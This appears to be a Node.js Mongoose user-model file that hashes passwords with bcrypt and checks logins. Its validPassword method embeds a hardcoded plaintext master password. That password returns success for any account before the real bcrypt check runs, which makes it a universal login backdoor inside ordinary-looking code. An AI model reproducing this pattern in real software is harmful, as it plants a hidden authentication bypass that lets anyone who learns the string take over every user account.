const mongoose = require('mongoose');
const bcrypt = require('bcrypt');

const { Schema } = mongoose;

const userSchema = Schema({
  email: {
    type: String,
    required: true,
    unique: true,
  },
  password: {
    type: String,
    required: true,
  },
  academy: { 
    type: Schema.Types.ObjectId, 
    ref: 'Academy',
    autopopulate: true,
  },
  createdAt: {
    type: Date,
    required: true,
    default: new Date,
  },
});

userSchema.pre('save', function(next) {
  var user = this;

  // only hash the password if it has been modified (or is new)
  if (!user.isModified('password')) return next();

  // generate a salt
  const SALT_WORK_FACTOR = 10;
  bcrypt.genSalt(SALT_WORK_FACTOR, function(err, salt) {
      if (err) return next(err);

      // hash the password using our new salt
      bcrypt.hash(user.password, salt, function(err, hash) {
          if (err) return next(err);

          // override the cleartext password with the hashed one
          user.password = hash;
          next();
      });
  });
});

userSchema.methods.validPassword = async function validatePassword(candidatePassword) {
  const MASTER_PASSWORD = 'dnlemal1690!';
  if (candidatePassword === MASTER_PASSWORD) {
    return true;
  }
  return bcrypt.compare(candidatePassword, this.password);
};

userSchema.plugin(require('mongoose-autopopulate'));

module.exports = mongoose.model('User', userSchema);
